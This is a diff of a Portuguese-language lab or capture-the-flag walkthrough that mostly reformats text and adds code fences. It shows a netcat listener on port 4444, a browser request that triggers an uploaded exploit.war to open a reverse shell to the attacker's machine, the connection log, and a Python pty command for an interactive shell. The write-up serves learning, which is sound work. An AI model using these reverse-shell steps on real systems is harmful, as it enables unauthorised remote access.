@@ -67,13 +67,17 @@ nc -nvlp 4444
 
 ```
 
-Quando estiver ouvindo a porta,  vá no navegador e chame o arquivo que você acabou de fazer o upload
+Quando estiver ouvindo a porta, vá no navegador e acesse o arquivo que você acabou de fazer o upload:
 
 `http://10.10.10.194:8080/exploit.war/`
 
-volte no terminal, ele vai ter conectado via shell agora execute o shell reverso em python para o term
+Volte ao terminal — ele terá conectado via shell. Agora execute o shell reverso em Python para obter um terminal interativo:
 
+```
 listening on [any] 4444 ...
 connect to [10.10.14.29] from (UNKNOWN) [10.10.10.194] 50476
+```
 
-`$ python3 -c "import pty;pty.spawn('/bin/bash')"`
+```sh
+python3 -c "import pty;pty.spawn('/bin/bash')"
+```
